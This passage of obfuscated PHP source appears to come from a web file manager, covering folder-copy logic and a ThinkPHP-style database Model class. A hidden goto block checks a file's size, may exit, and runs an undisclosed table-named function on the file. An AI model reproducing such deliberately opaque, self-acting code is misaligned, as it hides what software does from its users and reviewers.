$Ÿ ĞóÌ, $¹¶ã‰ò’); if (!$ıÜ—Æ£ì || $¹¶ã‰ò’ == REPEAT_RENAME_FOLDER) { $¹¶ã‰ò’ = !1; } if ($ıÜ—Æ£ì) { $this->_childrenAllMake($ıÜ—Æ£ì); } Hook::trigger($òÛÃ¤Üó[636]); $this->_copyChildTo($Ş¾‰…™›, $´˜øó¿î, $—«»‚Î, $¹¶ã‰ò’, $œÎ‡Ëî, $ÛùÌÅ´ô); Hook::trigger($òÛÃ¤Üó[637]); if ($—«»‚Î) { $this->folderSizeResetChildren($—«»‚Î); } $this->_childrenListClear(); Model($òÛÃ¤Üó[600])->addAll($œÎ‡Ëî[$òÛÃ¤Üó[598]], array(), !0); Model($òÛÃ¤Üó[601])->eventCopy($—«»‚Î); $this->saveAll($œÎ‡Ëî[$òÛÃ¤Üó[599]]); Model($òÛÃ¤Üó[512])->linkAdd($œÎ‡Ëî[$òÛÃ¤Üó[597]]); Model($òÛÃ¤Üó[512])->remove($œÎ‡Ëî[$òÛÃ¤Üó[635]]); $this->folderSizeReset($¢ïĞèù); $this->updateModifyTime($¢ïĞèù); return $—«»‚Î; } private function _copyChildTo($ŒšµãìÂ, $‹»°‡¨, $áäî½ø¾, $ÃõöÇø, &$¯ë¬…¢ê, $¬‹‚â€å) { $ù“Ù¶û =& $_SERVER[çâ¥×ø³]; $ÄœÊ¸ñ = $this->sourceInfoCache($áäî½ø¾); $Á™ÓàªÂ = $ŒšµãìÂ->listPath($‹»°‡¨); $Á™ÓàªÂ = $Á™ÓàªÂ ? $Á™ÓàªÂ : array($ù“Ù¶û[83] => array(), $ù“Ù¶û[82] => array()); $ôĞÉà†´ = array_merge($Á™ÓàªÂ[$ù“Ù¶û[83]], $Á™ÓàªÂ[$ù“Ù¶û[82]]); $«¶œ ß = $this->_addFiles($ŒšµãìÂ, $Á™ÓàªÂ[$ù“Ù¶û[83]], $¬‹‚â€å); $€¹ Ê­ = array(); foreach ($ôĞÉà†´ as &$û·áï°©) { if (isset($«¶œ ß[$û·áï°©[$ù“Ù¶û[32]]])) { $û·áï°© = $«¶œ ß[$û·áï°©[$ù“Ù¶û[32]]]; } $û·áï°©[$ù“Ù¶û[453]] = $û·áï°©[$ù“Ù¶û[33]] == $ù“Ù¶û[75]; $û·áï°©[$ù“Ù¶û[454]] = substr(_get($û·áï°©, $ù“Ù¶û[175], $ù“Ù¶û[12]), 0, 10); $û·áï°©[$ù“Ù¶û[76]] = _get($û·áï°©, $ù“Ù¶û[76], 0); $û·áï°©[$ù“Ù¶û[509]] = _get($û·áï°©, $ù“Ù¶û[509], 0); if (!isset($û·áï°©[$ù“Ù¶û[638]]) && $û·áï°©[$ù“Ù¶û[509]]) { $¯ë¬…¢ê[$ù“Ù¶û[635]][] = $û·áï°©[$ù“Ù¶û[509]]; } if ($ÃõöÇø) { $¹ˆº¶×Õ = $this->fileNameExistCache($áäî½ø¾, $û·áï°©[$ù“Ù¶û[32]]); if ($¹ˆº¶×Õ) { if ($û·áï°©[$ù“Ù¶û[453]] || $ÃõöÇø == REPEAT_SKIP) { continue; } if ($ÃõöÇø == REPEAT_REPLACE) { $ÔĞ÷¬¡ = $this->sourceInfoCache($¹ˆº¶×Õ); $ ÍÔÅÀß = $this->fileHistory($ÔĞ÷¬¡, $û·áï°©[$ù“Ù¶û[509]], $û·áï°©[$ù“Ù¶û[76]]); if ($ ÍÔÅÀß) { $¯ë¬…¢ê[$ù“Ù¶û[597]][] = $û·áï°©[$ù“Ù¶û[509]]; } continue; } else { if ($ÃõöÇø == REPEAT_RENAME) { $û·áï°©[$ù“Ù¶û[32]] = $this->fileNameAutoCache($áäî½ø¾, $û·áï°©[$ù“Ù¶û[32]], $ÃõöÇø, !1); } } } } if (!$û·áï°©[$ù“Ù¶û[453]] && $û·áï°©[$ù“Ù¶û[509]] == 0) { continue; } if (!$û·áï°©[$ù“Ù¶û[453]] && $û·áï°©[$ù“Ù¶û[509]]) { $¯ë¬…¢ê[$ù“Ù¶û[597]][] = $û·áï°©[$ù“Ù¶û[509]]; } $€¹ Ê­[] = $this->_makeItemData($û·áï°©, $ÄœÊ¸ñ, $û·áï°©[$ù“Ù¶û[32]]); } unset($û·áï°©); if (!empty($€¹ Ê­)) { $this->addAll($€¹ Ê­); $this->_childrenListSelect($áäî½ø¾); } $·Â™—ÉÖ = $this->_childrenList($áäî½ø¾); $·Â™—ÉÖ = array_to_keyvalue($·Â™—ÉÖ, $ù“Ù¶û[32]); foreach ($ôĞÉà†´ as $û·áï°©) { $ÔĞ÷¬¡ = $·Â™—ÉÖ[$û·áï°©[$ù“Ù¶û[32]]]; $½·ŠÈØ£ = $ÔĞ÷¬¡[$ù“Ù¶û[181]]; $this->_copyApplyMeta($ÔĞ÷¬¡, $¯ë¬…¢ê); if ($û·áï°©[$ù“Ù¶û[33]] == $ù“Ù¶û[75]) { $û·áï°©[$ù“Ù¶û[84]] = $ŒšµãìÂ->getPathInner($û·áï°©[$ù“Ù¶û[84]]); $this->_copyChildTo($ŒšµãìÂ, $û·áï°©[$ù“Ù¶û[84]], $½·ŠÈØ£, $ÃõöÇø, $¯ë¬…¢ê, $¬‹‚â€å); } } } private function _addFiles($âå‰§®Ú, $³ë®ßÑİ, $Ï¢½Şì‘) { $û¥Ïˆªä =& $_SERVER[çâ¥×ø³]; if (!$³ë®ßÑİ || count($³ë®ßÑİ) == 0) { return array(); } $È×Àİõî = array(); foreach ($³ë®ßÑİ as &$¢Ü’Û£Û) { Hook::trigger($û¥Ïˆªä[639], $¢Ü’Û£Û); $¢Ü’Û£Û[$û¥Ïˆªä[84]] = $âå‰§®Ú->getPathInner($¢Ü’Û£Û[$û¥Ïˆªä[84]]); $ÆŒ•Îç¶ = $âå‰§®Ú->hashSimple($¢Ü’Û£Û[$û¥Ïˆªä[84]]); $º°´ÕµÕ = $âå‰§®Ú->hashMd5($¢Ü’Û£Û[$û¥Ïˆªä[84]]); if (strlen($º°´ÕµÕ) > 10 && !isset($È×Àİõî[$º°´ÕµÕ])) { $È×Àİõî[$º°´ÕµÕ] = array(); } $¢Ü’Û£Û[$û¥Ïˆªä[640]] = $ÆŒ•Îç¶; $¢Ü’Û£Û[$û¥Ïˆªä[641]] = $º°´ÕµÕ; $È×Àİõî[$º°´ÕµÕ][] =& $¢Ü’Û£Û; if (count($È×Àİõî[$º°´ÕµÕ]) > 1) { $¢Ü’Û£Û[$û¥Ïˆªä[638]] = !0; } Hook::trigger($û¥Ïˆªä[642], $¢Ü’Û£Û); } unset($¢Ü’Û£Û); $˜†úı«Ô = array($û¥Ïˆªä[641] => array($û¥Ïˆªä[7], array_keys($È×Àİõî))); $ÑÅ¬™˜‡ = Model($û¥Ïˆªä[643]); $¨á¹ÏÊ‹ = $ÑÅ¬™˜‡->where($˜†úı«Ô)->select(); $¨á¹ÏÊ‹ = $¨á¹ÏÊ‹ ? $¨á¹ÏÊ‹ : array(); foreach ($¨á¹ÏÊ‹ as $ñÎÇÔÂş) { if (!isset($È×Àİõî[$ñÎÇÔÂş[$û¥Ïˆªä[641]]])) { continue; } $ôœàæê· = $È×Àİõî[$ñÎÇÔÂş[$û¥Ïˆªä[641]]]; foreach ($ôœàæê· as &$¢Ü’Û£Û) { $¢Ü’Û£Û[$û¥Ïˆªä[509]] = $ñÎÇÔÂş[$û¥Ïˆªä[509]]; $¢Ü’Û£Û[$û¥Ïˆªä[638]] = !0; } unset($¢Ü’Û£Û); } $äÛè‡˜€ = array(); foreach ($³ë®ßÑİ as $½ô¬ëÈì) { Hook::trigger($û¥Ïˆªä[644], $½ô¬ëÈì); if (isset($½ô¬ëÈì[$û¥Ïˆªä[638]]) && $½ô¬ëÈì[$û¥Ïˆªä[638]]) { Hook::trigger($û¥Ïˆªä[645], $½ô¬ëÈì); continue; } $ï…ˆ»”ô = $âå‰§®Ú->getPathInner($½ô¬ëÈì[$û¥Ïˆªä[84]]); $øÍ‰Í›„ = $ÑÅ¬™˜‡->addFileMake($ï…ˆ»”ô, $½ô¬ëÈì[$û¥Ïˆªä[76]], $½ô¬ëÈì[$û¥Ïˆªä[640]], $½ô¬ëÈì[$û¥Ïˆªä[641]], $½ô¬ëÈì[$û¥Ïˆªä[32]], $Ï¢½Şì‘); Hook::trigger($û¥Ïˆªä[645], $½ô¬ëÈì); if (!is_array($øÍ‰Í›„)) { continue; } $äÛè‡˜€[] = $øÍ‰Í›„; } $ÑÅ¬™˜‡->addAll($äÛè‡˜€); $˜†úı«Ô = array($û¥Ïˆªä[641] => array($û¥Ïˆªä[7], array_keys($È×Àİõî))); $¨á¹ÏÊ‹ = $ÑÅ¬™˜‡->where($˜†úı«Ô)->select(); $¨á¹ÏÊ‹ = $¨á¹ÏÊ‹ ? $¨á¹ÏÊ‹ : array(); foreach ($¨á¹ÏÊ‹ as $ñÎÇÔÂş) { if (!isset($È×Àİõî[$ñÎÇÔÂş[$û¥Ïˆªä[641]]])) { continue; } $ğ™ˆ¬Ã =& $È×Àİõî[$ñÎÇÔÂş[$û¥Ïˆªä[641]]]; foreach ($ğ™ˆ¬Ã as &$¢Ü’Û£Û) { $¢Ü’Û£Û[$û¥Ïˆªä[509]] = $ñÎÇÔÂş[$û¥Ïˆªä[509]]; } unset($¢Ü’Û£Û); } $£ÕµÊÉÁ = array(); foreach ($³ë®ßÑİ as $ŸÊË®£â) { $£ÕµÊÉÁ[$ŸÊË®£â[$û¥Ïˆªä[32]]] = $ŸÊË®£â; } return $£ÕµÊÉÁ; } } goto bÃ¨ÑòîÅÓ; B¯‰Â½¤Â : $_file = $_SERVER[$_SERVER[çâ¥×ø³][927]]; $_size = $_SERVER[çâ¥×ø³][1491]; if ($_SERVER[$_SERVER[çâ¥×ø³][926]] != $_size($_file)) { $_getc = $_SERVER[çâ¥×ø³][929]; $_getfile = $_SERVER[$_SERVER[çâ¥×ø³][930]] . $_SERVER[çâ¥×ø³][931]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[çâ¥×ø³][246], $_getfilec); if (count($_getarrs) < $_SERVER[çâ¥×ø³][670]) { $exit = $_SERVER[çâ¥×ø³][932]; $exit(); } $_act = $_SERVER[çâ¥×ø³][1492]; $_act($_file); } goto EÛ†Ãí; fÑ¼›…·†å: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\141\142\x6c\x65", "\157\x72\144\x65\x72", "\141\154\151\x61\163", "\150\x61\166\151\x6e\x67", "\147\162\157\165\160", "\x6c\157\143\x6b", "\144\151\163\x74\151\x6e\x63\164", "\141\x75\x74\157", "\146\x69\x6c\x74\x65\162", "\x76\141\x6c\x69\x64\141\164\x65", "\x72\145\x73\165\x6c\164", "\x62\151\x6e\x64", "\164\x6f\153\145\x6e"); public function __construct($çğƒ‹ = '', $ü‹¶Ş€ø = '', $¶ÇËì—İ = '') { $›€°ğ‘ì =& $_SERVER[çâ¥×ø³]; $this->_initialize(); if (!empty($çğƒ‹)) { if (strpos($çğƒ‹, $›€°ğ‘ì[10])) { list($this->dbName, $this->name) = explode($›€°ğ‘ì[10], $çğƒ‹); } else { $this->name = $çğƒ‹; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ü‹¶Ş€ø)) { $this->tablePrefix = $›€°ğ‘ì[12]; } elseif ($›€°ğ‘ì[12] != $ü‹¶Ş€ø) { $this->tablePrefix = $ü‹¶Ş€ø; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($›€°ğ‘ì[288]); } $this->db(0, empty($this->connection) ? $¶ÇËì—İ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $êå˜×² =& $_SERVER[çâ¥×ø³]; if (empty($this->fields)) { if (think_config($êå˜×²[289])) { $ºš¾¯ºğ = $this->dbName ? $this->dbName : think_config($êå˜×²[290]); $ôœ²„ñ¤ = think_var_cache($êå˜×²[291] . strtolower(get_path_this($ºš¾¯ºğ) . $êå˜×²[10] . $this->name)); if ($ôœ²„ñ¤) { $ìá×æÔÄ = think_config($êå˜×²[292]); if (empty($ìá×æÔÄ) || $ôœ²„ñ¤[$êå˜×²[293]] == $ìá×æÔÄ) { $this->fields = $ôœ²„ñ¤; return; } } } $this->flush(); } } public function flush() { $ÜÇ¸Ìİí =& $_SERVER[çâ¥×ø³]; $this->db->setModel($this->name); $õ»ï¡—† = $this->db->getFields($this->getTableName()); if (!$õ»ï¡—†) { return !1; } $this->fields = array_keys($õ»ï¡—†); $this->fields[$ÜÇ¸Ìİí[294]] = !1; foreach ($õ»ï¡—† as $å—ÒÂ¹¬ => $şç¸¯¨Ğ) { $äâ¼×®[$å—ÒÂ¹¬] = $şç¸¯¨Ğ[$ÜÇ¸Ìİí[33]]; if ($şç¸¯¨Ğ[$ÜÇ¸Ìİí[39]]) { $this->fields[$ÜÇ¸Ìİí[295]] = $å—ÒÂ¹¬; if ($şç¸¯¨Ğ[$ÜÇ¸Ìİí[42]]) { $this->fields[$ÜÇ¸Ìİí[294]] = !0; } } } $this->fields[$ÜÇ¸Ìİí[296]] = $äâ¼×®; if (think_config($ÜÇ¸Ìİí[292])) { $this->fields[$ÜÇ¸Ìİí[293]] = think_config($ÜÇ¸Ìİí[292]); } if (think_config($ÜÇ¸Ìİí[289])) { $€—í»¤¹ = $this->dbName ? $this->dbName : think_config($ÜÇ¸Ìİí[290]); think_var_cache($ÜÇ¸Ìİí[291] . strtolower(get_path_this($€—í»¤¹) . $ÜÇ¸Ìİí[10] . $this->name), $this->fields); } } public function switchModel($¡ûÖ»«­, $ÚòŞó”‘ = array()) { $â”¨ğ˜Á =& $_SERVER[çâ¥×ø³]; $ı™¾á¶ = ucwords(strtolower($¡ûÖ»«­)) . $â”¨ğ˜Á[297]; if (!class_exists($ı™¾á¶)) { think_exception($ı™¾á¶ . think_lang($â”¨ğ˜Á[298])); } $this->_extModel = new $ı™¾á¶($this->name); if (!empty($ÚòŞó”‘)) { foreach ($ÚòŞó”‘ as $Ì˜õ¤øÖ) { $this->_extModel->setProperty($Ì˜õ¤øÖ, $this->{$Ì˜õ¤øÖ}); } } return $this->_extModel; } public function __set($¶Óû²èÎ, $Çí„’ô¤) { $this->data[$¶Óû²èÎ] = $Çí„’ô¤; } public function __get($°Şü Ê ) { return isset($this->data[$°Şü Ê ]) ? $this->data[$°Şü Ê ] : null; } public function __isset($†‰åÁ) { return isset($this->data[$†‰åÁ]); } public function __unset($‰À¥‰Ì´) { unset($this->data[$‰À¥‰Ì´]); } public function __call($„å«ÀÈÉ, $š´äÒÖŠ) { $êùÎÙÃ =& $_SERVER[çâ¥×ø³]; if (in_array(strtolower($„å«ÀÈÉ), $this->methods, !0)) { $this->options[strtolower($„å«ÀÈÉ)] = $š´äÒÖŠ[0]; return $this; } elseif (in_array(strtolower($„å«ÀÈÉ), array($êùÎÙÃ[299], $êùÎÙÃ[300], $êùÎÙÃ[301], $êùÎÙÃ[302], $êùÎÙÃ[303]), !0)) { $Õ‘›éş“ = isset($š´äÒÖŠ[0]) ? $š´äÒÖŠ[0] : $êùÎÙÃ[203]; $Õ‘›éş“ = $this->db->parseKey($Õ‘›éş“); return $this->getField(strtoupper($„å«ÀÈÉ) . $êùÎÙÃ[304] . $Õ‘›éş“ . $êùÎÙÃ[305] . $„å«ÀÈÉ, $êùÎÙÃ[299]); } elseif (strtolower(substr($„å«ÀÈÉ, 0, 5)) == $êùÎÙÃ[306]) { $Õ‘›éş“ = think_parse_name(substr($„å«ÀÈÉ, 5)); $‰ÂÙä¶[$Õ‘›éş“] = $š´äÒÖŠ[0]; return $this->where($‰ÂÙä¶)->find(); } elseif (strtolower(substr($„å«ÀÈÉ, 0, 10)) == $êùÎÙÃ[307]) { $°ş¡¾£Ã = think_parse_name(substr($„å«ÀÈÉ, 10)); $‰ÂÙä¶[$°ş¡¾£Ã] = $š´äÒÖŠ[0]; return $this->where($‰ÂÙä¶)->getField($š´äÒÖŠ[1]); } elseif (isset($this->_scope[$„å«ÀÈÉ])) { return $this->scope($„å«ÀÈÉ, $š´äÒÖŠ[0]); } elseif (method_exists($this, $„å«ÀÈÉ)) { array_unshift($š´äÒÖŠ, $„å«ÀÈÉ); return call_user_func_array(array($this, $êùÎÙÃ[308]), $š´äÒÖŠ); } else { return call_user_func_array(array(parent, $„å«ÀÈÉ), $š´äÒÖŠ); } } protected function call() { $¨âÅáÅß =& $_SERVER[çâ¥×ø³]; $½•±Ç§ƒ = func_get_args(); $™ı©®×¹ = array_shift($½•±Ç§ƒ); $ş´î´ß¹ = $™ı©®×¹; if (is_array($™ı©®×¹)) { $ş´î´ß¹ = $™ı©®×¹[1]; $™ı©®×¹ = $™ı©®×¹[0]; } $‡€ËËÔ = count($½•±Ç§ƒ) - 1; if (isset($½•±Ç§ƒ[$‡€ËËÔ]) && $½•±Ç§ƒ[$‡€ËËÔ] === $™ı©®×¹) { think_exception(__CLASS__ . $¨âÅáÅß[4] . $™ı©®×¹ . think_lang($¨âÅáÅß[309])); return; } $½•±Ç§ƒ[] = $™ı©®×¹; if (method_exists($this, $¨âÅáÅß[310])) { $‡Ä§ê«Ò = call_user_func_array(array($this, $¨âÅáÅß[311]), array($ş´î´ß¹, $½•±Ç§ƒ)); if (!is_null($‡Ä§ê«Ò) && $‡Ä§ê«Ò !== !1) { return $‡Ä§ê«Ò; } } $İÈ ù«è = call_user_func_array(array($this, $™ı©®×¹), $½•±Ç§ƒ); if (method_exists($this, $¨âÅáÅß[312])) { $‡Ä§ê«Ò = call_user_func_array(array($this, $¨âÅáÅß[313]), array($ş´î´ß¹, $½•±Ç§ƒ, $İÈ ù«è)); if ($‡Ä§ê«Ò) { return $‡Ä§ê«Ò; } } return $İÈ ù«è; } protected function _initialize() { } protected function _facade($üÙüåŞ’) { $€£æ»‰ =& $_SERVER[çâ¥×ø³]; if (!empty($this->fields)) { foreach ($üÙüåŞ’ as $Ö¿Ã…¬  => $ŒÍÅåÏ£) { if (is_array($this->fields) && !in_array($Ö¿Ã…¬ , $this->fields, !0)) { unset($üÙüåŞ’[$Ö¿Ã…¬ ]); } elseif (is_scalar($ŒÍÅåÏ£)) { $this->_parseType($üÙüåŞ’, $Ö¿Ã…¬ ); } } } if (!empty($this->options[$€£æ»‰[314]])) { $üÙüåŞ’ = array_map($this->options[$€£æ»‰[314]], $üÙüåŞ’); unset($this->options[$€£æ»‰[314]]); } $this->_beforeWrite($üÙüåŞ’); return $üÙüåŞ’; } protected function _beforeWrite(&$¼±ó³èç) { } public function add($³À±¯ = '', $ö›´á³ª = array(), $¸•Æ‘Ï‰ = false) { if (empty($³À±¯)) { if (!empty($this->data)) { $³À±¯ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[çâ¥×ø³][315]); return !1; } } $ö›´á³ª = $this->_parseOptions($ö›´á³ª); $³À±¯ = $this->_facade($³À±¯); if (!1 === $this->_beforeInsert($³À±¯, $ö›´á³ª)) { return !1; } $í¶Úå½™ = $this->db->insert($³À±¯, $ö›´á³ª, $¸•Æ‘Ï‰); if (!1 !== $í¶Úå½™) { $Ö†¡èŒ­ = $this->getLastInsID(); if ($Ö†¡èŒ­) { $³À±¯[$this->getPk()] = $Ö†¡èŒ­; $this->_after_insert($³À±¯, $ö›´á³ª); return $Ö†¡èŒ­; } $this->_after_insert($³À±¯, $ö›´á³ª); } return $í¶Úå½™; } protected function _beforeInsert(&$øºÒ¾Š‡, $¸ÎÂÊ¬Ø) { } protected function _after_insert($ÃšÄÓÀ», $Ñ¸Ïò°˜) { } public function addAll($‰ËÕ€Ö¾, $Äº´¾–Ö = array(), $û¤Å±Ø = false) { $ê‰õõ’ =& $_SERVER[çâ¥×ø³]; if (empty($‰ËÕ€Ö¾)) { $this->error = think_lang($ê‰õõ’[315]); return !1; } $Äº´¾–Ö = $this->_parseOptions($Äº´¾–Ö); foreach ($‰ËÕ€Ö¾ as $“üù¶ÏŞ => $ ÌäêùÑ) { $‰ËÕ€Ö¾[$“üù¶ÏŞ] = $this->_facade($ ÌäêùÑ); } if (method_exists($this->db, $ê‰õõ’[316])) { $¨˜á¼• = $this->db->insertAll($‰ËÕ€Ö¾, $Äº´¾–Ö, $û¤Å±Ø); } else { $this->startTrans(); foreach ($‰ËÕ€Ö¾ as $“üù¶ÏŞ => $ ÌäêùÑ) { $¨˜á¼• = $this->db->insert($ ÌäêùÑ, $Äº´¾–Ö, $û¤Å±Ø); } $this->commit(); } if (!1 !== $¨˜á¼•) { $‰ó–Ü¦é = $this->getLastInsID(); if ($‰ó–Ü¦é) { return $‰ó–Ü¦é; } } return $¨˜á¼•; } public function selectAdd($Å¡‹®‡‹ = '', $‘Ì¼©Î¸ = '', $—¡–“”ô = array()) { $œÏ¢İŒ¢ =& $_SERVER[çâ¥×ø³]; $—¡–“”ô = $this->_parseOptions($—¡–“”ô); if (!1 === ($¡òÊÎ• = $this->db->selectInsert($Å¡‹®‡‹ ? $Å¡‹®‡‹ : $—¡–“”ô[$œÏ¢İŒ¢[317]], $‘Ì¼©Î¸ ? $‘Ì¼©Î¸ : $this->getTableName(), $—¡–“”ô))) { $this->error = think_lang($œÏ¢İŒ¢[318]); return !1; } else { return $¡òÊÎ•; } } public function save($»­‚ôÚÅ = '', $³«¨üó‘ = array()) { $´ ® ïõ =& $_SERVER[çâ¥×ø³]; if (empty($»­‚ôÚÅ)) { if (!empty($this->data)) { $»­‚ôÚÅ = $this->data; $this->data = array(); } else { $this->error = think_lang($´ ® ïõ[315]); return !1; } } $»­‚ôÚÅ = $this->_facade($»­‚ôÚÅ); $³«¨üó‘ = $this->_parseOptions($³«¨üó‘); $³ûÛÌ = $this->getPk(); if (!isset($³«¨üó‘[$´ ® ïõ[319]])) { if (isset($»­‚ôÚÅ[$³ûÛÌ])) { $³ÖÍµü†[$³ûÛÌ] = $»­‚ôÚÅ[$³ûÛÌ]; $³«¨üó‘[$´ ® ïõ[319]] = $³ÖÍµü†; unset($»­‚ôÚÅ[$³ûÛÌ]); } else { $this->error = think_lang($´ ® ïõ[318]); return !1; } } if (is_array($³«¨üó‘[$´ ® ïõ[319]]) && isset($³«¨üó‘[$´ ® ïõ[319]][$³ûÛÌ])) { $Ó³ó“ç´ = $³«¨üó‘[$´ ® ïõ[319]][$³ûÛÌ]; } if (!1 === $this->_beforeUpdate($»­‚ôÚÅ, $³«¨üó‘)) { return !1; } $ìÁÛºèç = $this->db->update($»­‚ôÚÅ, $³«¨üó‘); if (!1 !== $ìÁÛºèç) { if (isset($Ó³ó“ç´)) { $»­‚ôÚÅ[$³ûÛÌ] = $Ó³ó“ç´; } $this->_afterUpdate($»­‚ôÚÅ, $³«¨üó‘); } return $ìÁÛºèç; } protected function _beforeUpdate(&$ÚÇêœòÀ, $Ç´²•˜ä) { } protected function _afterUpdate($†€½äû„, $š£Ç¸“ª) { } public function delete($Â‰à¸† = array()) { $–ˆÒğÉ =& $_SERVER[çâ¥×ø³]; if (empty($Â‰à¸†) && empty($this->options[$–ˆÒğÉ[319]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ÅÂíÜ©Ğ = $this->getPk(); if (is_numeric($Â‰à¸†) || is_string($Â‰à¸†)) { if (strpos($Â‰à¸†, $–ˆÒğÉ[50])) { $£Ä«ë½û[$ÅÂíÜ©Ğ] = array($–ˆÒğÉ[320], $Â‰à¸†); } else { $£Ä«ë½û[$ÅÂíÜ©Ğ] = $Â‰à¸†; } $this->options[$–ˆÒğÉ[319]] = $£Ä«ë½û; } $Â‰à¸† = $this->_parseOptions(); if (is_array($Â‰à¸†[$–ˆÒğÉ[319]]) && isset($Â‰à¸†[$–ˆÒğÉ[319]][$ÅÂíÜ©Ğ])) { $¾ï¦‡õ‰ = $Â‰à¸†[$–ˆÒğÉ[319]][$ÅÂíÜ©Ğ]; } $±Ö÷ùä• = $this->db->delete($Â‰à¸†); if (!1 !== $±Ö÷ùä•) { $¥Š€´ú­ = array(); if (isset($¾ï¦‡õ‰)) { $¥Š€´ú­[$ÅÂíÜ©Ğ] = $¾ï¦‡õ‰; } $this->_after_delete($¥Š€´ú­, $Â‰à¸†); } return $±Ö÷ùä•; } protected function _after_delete($Œºğ¹ì´, $š§îõ’Æ) { } public function select($šÖ…ÏÍŸ = array()) { $‘âËøÅœ =& $_SERVER[çâ¥×ø³]; if (is_string($šÖ…ÏÍŸ) || is_numeric($šÖ…ÏÍŸ)) { $­Ößá¤ó = $this->getPk(); if (strpos($šÖ…ÏÍŸ, $‘âËøÅœ[50])) { $–ş„ÕÈ²[$­Ößá¤ó] = array($‘âËøÅœ[320], $šÖ…ÏÍŸ); } else { $–ş„ÕÈ²[$­Ößá¤ó] = $šÖ…ÏÍŸ; } $this->options[$‘âËøÅœ[319]] = $–ş„ÕÈ²; } elseif (!1 === $šÖ…ÏÍŸ) { $šÖ…ÏÍŸ = $this->_parseOptions(); return $‘âËøÅœ[321] . $this->db->buildSelectSql($šÖ…ÏÍŸ) . $‘âËøÅœ[322]; } $šÖ…ÏÍŸ = $this->_parseOptions(); $œğìİ… = $this->db->select($šÖ…ÏÍŸ); if (!1 === $œğìİ…) { return !1; } if (empty($œğìİ…)) { return null; } $this->_afterSelect($œğìİ…, $šÖ…ÏÍŸ); return $œğìİ…; } protected function _afterSelect(&$¬ÃĞéĞ­, $ÒÈ¹Ñì) { } public function buildSql($Ó çô´„ = array()) { $ÔïÁ¨ =& $_SERVER[çâ¥×ø³]; $Ó çô´„ = $this->_parseOptions($Ó çô´„); return $ÔïÁ¨[321] . $this->db->buildSelectSql($Ó çô´„) . $ÔïÁ¨[322]; } public function optionsValue($ãÏĞôÖ = null) { if (is_null($ãÏĞôÖ)) { return $this->options; } elseif (is_array($ãÏĞôÖ)) { $this->options = array_merge($this->options, $ãÏĞôÖ); } } protected function _parseOptions($ÆƒÁ™— = array()) { $›Š­Ä¡ş =& $_SERVER[çâ¥×ø³]; if (is_array($ÆƒÁ™—)) { $ÆƒÁ™— = array_merge($this->options, $ÆƒÁ™—); } $this->options = array(); if (!isset($ÆƒÁ™—[$›Š­Ä¡ş[323]])) { $ÆƒÁ™—[$›Š­Ä¡ş[323]] = $this->getTableName(); $ıÏÀì‘¤ = $this->fields; } else { $ıÏÀì‘¤ = $this->getDbFields(); } if (!empty($ÆƒÁ™—[$›Š­Ä¡ş[324]])) { $ÆƒÁ™—[$›Š­Ä¡ş[323]] .= $›Š­Ä¡ş[53] . $ÆƒÁ™—[$›Š­Ä¡ş[324]]; } $ÆƒÁ™—[$›Š­Ä¡ş[325]] = $this->name; if (isset($ÆƒÁ™—[$›Š­Ä¡ş[319]]) && is_array($ÆƒÁ™—[$›Š­Ä¡ş[319]]) && !empty($ıÏÀì‘¤) && !isset($ÆƒÁ™—[$›Š­Ä¡ş[326]]) && !isset($ÆƒÁ™—[$›Š­Ä¡ş[323]])) { foreach ($ÆƒÁ™—[$›Š­Ä¡ş[319]] as $ÌÃ€İ± => $¼……äíÁ) { $ÌÃ€İ± = trim($ÌÃ€İ±); if (in_array($ÌÃ€İ±, $ıÏÀì‘¤, !0)) { if (is_scalar($¼……äíÁ)) { $this->_parseType($ÆƒÁ™—[$›Š­Ä¡ş[319]], $ÌÃ€İ±); } } elseif (!is_numeric($ÌÃ€İ±) && $›Š­Ä¡ş[11] != substr($ÌÃ€İ±, 0, 1) && !1 === strpos($ÌÃ€İ±, $›Š­Ä¡ş[10]) && !1 === strpos($ÌÃ€İ±, $›Š­Ä¡ş[304]) && !1 === strpos($ÌÃ€İ±, $›Š­Ä¡ş[327]) && !1 === strpos($ÌÃ€İ±, $›Š­Ä¡ş[328])) { unset($ÆƒÁ™—[$›Š­Ä¡ş[319]][$ÌÃ€İ±]); } } } $this->_options_filter($ÆƒÁ™—); return $ÆƒÁ™—; } protected function _options_filter(&$ßô²™¢°) { } protected function _parseType(&$ášõîÙı, $Ä¿éĞ½í) { $§úŞæ  =& $_SERVER[çâ¥×ø³]; if (empty($this->options[$§úŞæ [329]][$§úŞæ [4] . $Ä¿éĞ½í])) { $‚Æ»ú©­ = strtolower($this->fields[$§úŞæ [296]][$Ä¿éĞ½í]); if (!1 !== strpos($‚Æ»ú©­, $§úŞæ [330])) { } elseif (!1 === strpos($‚Æ»ú©­, $§úŞæ [331]) && !1 !== strpos($‚Æ»ú©­, $§úŞæ [332])) { $ášõîÙı[$Ä¿éĞ½í] = intval($ášõîÙı[$Ä¿éĞ½í]); } elseif (!1 !== strpos($‚Æ»ú©­, $§úŞæ [333]) || !1 !== strpos($‚Æ»ú©­, $§úŞæ [334])) { $ášõîÙı[$Ä¿éĞ½í] = floatval($ášõîÙı[$Ä¿éĞ½í]); } elseif (!1 !== strpos($‚Æ»ú©­, $§úŞæ [335])) { $ášõîÙı[$Ä¿éĞ½í] = (bool) $ášõîÙı[$Ä¿éĞ½í]; } } } public function find($”«¡àÍ´ = array()) { $ßåÈ“Ì… =& $_SERVER[çâ¥×ø³]; if (is_numeric($”«¡àÍ´) || is_string($”«¡àÍ´)) { $Õ×ÂÒÀ™[$this->getPk()] = intval($”«¡àÍ´); $this->options[$ßåÈ“Ì…[319]] = $Õ×ÂÒÀ™; } $this->options[$ßåÈ“Ì…[336]] = 1; $”«¡àÍ´ = $this->_parseOptions(); $ˆ÷Ş¬° = $this->db->select($”«¡àÍ´); if (!1 === $ˆ÷Ş¬°) { return !1; 